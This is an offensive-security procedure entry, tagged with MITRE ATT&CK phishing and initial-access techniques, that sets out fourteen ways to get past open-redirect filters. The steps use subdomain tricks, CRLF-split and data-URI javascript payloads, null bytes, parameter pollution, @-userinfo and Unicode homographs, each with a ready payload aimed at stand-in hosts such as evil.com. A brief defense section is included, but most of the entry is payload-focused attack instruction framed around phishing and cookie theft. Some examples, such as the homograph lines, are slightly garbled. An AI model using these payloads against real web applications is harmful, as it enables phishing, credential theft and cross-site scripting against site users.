---
id: 9f1da970-5d4f-4d6f-8200-032310364348
name: Bypass-Open-URL-Redirection-Filters
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:31.801592+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Drive-by Compromise|T1189 - Drive-by Compromise]]'
  - '[[techniques/Phishing|T1566 - Phishing]]'
sub_techniques:
  - '[[sub-techniques/Spearphishing Link|T1566.002 - Spearphishing Link]]'
tags:
  - '[[tags/Filter Bypass]]'
  - '[[tags/Open URL Redirection]]'
  - '[[tags/Phishing]]'
commands:
  - '[[commands/curl-follow-redirect]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Bypass-Open-URL-Redirection-Filters

## Summary

This procedure demonstrates multiple techniques to bypass filters and validation mechanisms in open URL redirection vulnerabilities, allowing attackers to redirect users from a trusted site to malicious domains for phishing, malware delivery, or credential theft. By exploiting weaknesses in input validation, such as blacklisted keywords, protocol checks, or domain whitelists, attackers can craft payloads that evade detection while achieving the redirect.

## Description

Open URL redirection vulnerabilities occur when a web application redirects users based on unvalidated user-supplied input, such as a 'url' or 'next' parameter in a login or reset flow. Filters may block direct malicious URLs, but bypasses like subdomain appending, encoding, null bytes, or protocol manipulation can trick the application into allowing the redirect. This procedure covers common bypass methods, including whitelisted domain tricks, Unicode normalization evasion, parameter pollution, and protocol wrappers that can also chain into XSS. These techniques are applicable in phishing campaigns or drive-by attacks on public-facing web apps. Success enables attackers to impersonate legitimate sites, leading to session hijacking or data exfiltration. The target environment is typically a web application with redirect endpoints, tested via browser or proxy tools.

## Requirements

1. Access to a vulnerable web application with an open redirect endpoint (e.g., /redirect?url=).
2. Knowledge of the application's filter rules (e.g., blacklisted protocols like 'javascript:', whitelisted domains).
3. Tools for crafting and testing URLs, such as a browser, proxy (e.g., [[tools/Burp-Suite]]), or command-line client like curl.
4. A controlled malicious domain or site for the redirect target.

## Defense

- Validate and sanitize all redirect parameters by using a strict whitelist of allowed domains and protocols; reject any input not matching the whitelist.
- Implement Content Security Policy (CSP) headers to restrict navigations and script execution.
- Use HTTP Strict Transport Security (HSTS) to enforce HTTPS and prevent protocol downgrade attacks.
- Log and monitor redirect attempts, alerting on suspicious patterns like encoded characters or multiple parameters.
- Employ URL normalization and canonicalization to defeat encoding and Unicode bypasses.

## Objectives

1. Evade URL validation filters to enable redirection to arbitrary malicious sites.
2. Chain redirects with XSS payloads for enhanced exploitation, such as stealing cookies or keystrokes.
3. Facilitate phishing by making malicious links appear legitimate, leading to credential harvest or malware infection.

## Instructions

### Step 1: Whitelisted Domain Subdomain Bypass

**Context**: Append a malicious domain as a subdomain to a whitelisted domain to trick filters that only check the base domain. This step crafts a URL that resolves to the attacker's site while appearing whitelisted.

**Payload** ([[codes/Whitelisted-Domain-Subdomain-Bypass]]):

www.whitelisted.com.evil.com

> Use this payload in the redirect parameter, e.g., /redirect?url=http://www.whitelisted.com.evil.com. Test with [[commands/curl-follow-redirect]] to verify the redirect to evil.com. Expected: The browser or client follows to the malicious site without filter triggers.

### Step 2: JavaScript Keyword Bypass with Line Breaks

**Context**: Split blacklisted keywords like 'javascript:' using URL-encoded line breaks (%0d%0a) to evade string matching filters, enabling XSS via protocol handler.

**Payload** ([[codes/JavaScript-Keyword-Bypass-With-Line-Breaks]]):

java%0d%0ascript%0d%0a:alert(0)

> Insert into redirect param: /redirect?url=java%0d%0ascript%0d%0a:alert(0). This executes JS in the victim's browser. Verify by observing the alert popup; use developer tools to confirm no filter block.

### Step 3: Double Slash Protocol Bypass

**Context**: Use // or //// to mimic relative paths or bypass protocol blacklists, interpreting as http:// but resolving externally.

**Payload** ([[codes/Double-Slash-URL-Bypass]]):

//google.com
////google.com

> Test: /redirect?url=//evil.com. The app may treat it as relative but browser resolves absolutely. Expected: Redirect to evil.com; check network tab for 3xx response.

### Step 4: HTTPS Colon Bypass

**Context**: Omit // after https: to bypass filters expecting full protocol syntax, still triggering secure redirect.

**Payload** ([[codes/HTTPS-Colon-URL-Bypass]]):

https:google.com

> Use: /redirect?url=https:evil.com. This evades // blocks. Success: Secure redirect without downgrade warnings.

### Step 5: Unicode Dot Character Bypass

**Context**: Replace '.' with Unicode fullwidth dot (。 or %E3%80%82) to evade dot-based blacklists or normalization checks.

**Payload** ([[codes/Unicode-Dot-Redirect-Bypass]]):

/?redir=google。com
//google%E3%80%82com

> Craft: /redirect?url=//google%E3%80%82com. The app may not normalize, allowing redirect. Expected: Resolution to evil.com equivalent.

### Step 6: Null Byte URL Termination Bypass

**Context**: Append %00 (null byte) to terminate filter string processing, allowing access to blocked suffixes.

**Payload** ([[codes/Null-Byte-URL-Bypass]]):

//google%00.com

> Test: /redirect?url=//evil%00.com. Filter sees //evil, but full URL redirects. Success: Access without block.

### Step 7: Parameter Pollution Redirect Bypass

**Context**: Supply multiple 'next' or 'url' parameters; if the app processes the last one, use it for malicious redirect while first is whitelisted.

**Payload** ([[codes/Parameter-Pollution-Redirect-Bypass]]):

?next=whitelisted.com&next=google.com

> Use: /redirect?next=good.com&next=evil.com. Expected: Redirect to evil.com if last param wins.

### Step 8: At Symbol Basic Auth Bypass

**Context**: Use @ to fake basic auth credentials, redirecting host to malicious site while appearing as legit URL.

**Payload** ([[codes/At-Symbol-URL-Redirect]]):

http://www.theirsite.com@yoursite.com/

> Craft: /redirect?url=http://legitsite.com@evil.com. Browser prompts or redirects to evil. Success: No auth prompt if bypassed.

### Step 9: Nested Path URL Bypass

**Context**: Nest malicious URL in path or subpath to evade parameter-only filters.

**Payload** ([[codes/Nested-Path-URL-Redirect]]):

http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com

> Test: /redirect?url=http://yoursite.com/http://evil.com. App may parse as path but redirect. Expected: External navigation.

### Step 10: Query String Embedded URL Bypass

**Context**: Embed full URL in query param value to bypass direct URL checks.

**Payload** ([[codes/Query-String-Embedded-URL-Redirect]]):

http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com

> Use: /redirect?url=http://yoursite.com?evil.com. Success: Redirect via query parsing.

### Step 11: Homograph Unicode Normalization Bypass

**Context**: Use homoglyphs or zero-width chars to mimic legit domains, evading visual or normalization filters.

**Payload** ([[codes/Homograph-Unicode-Normalization-Bypass]]):

https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com

> Craft with chars: /redirect?url=https://evil.c℀om. Expected: Resolves to malicious despite visual similarity.

### Step 12: JavaScript Variable Injection Bypass

**Context**: Inject into JS contexts via redirect param reflected in script, closing tags to execute payload.

**Payload** ([[codes/JavaScript-Variable-XSS-Payload]]):

";alert(0);//

> If param in <script>var x = "PARAM";</script>, use to close and inject. Success: Alert executes.

### Step 13: Data URI Base64 Encoded XSS Redirect

**Context**: Encode malicious HTML/JS in base64 data: URI to bypass URL filters, executing on redirect.

**Payload** ([[codes/Data-URI-Base64-XSS-Redirect]]):

http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==

> Use full URL. Expected: Base64 decodes to <script>alert("XSS")</script>, executes.

### Step 14: JavaScript Protocol Direct XSS Redirect

**Context**: Use javascript: protocol in redirect to execute JS directly in victim's context.

**Payload** ([[codes/JavaScript-Protocol-XSS-Redirect]]):

http://www.example.com/redirect.php?url=javascript:prompt(1)

> Test: Redirect triggers prompt(1). Success: JS execution without external load.
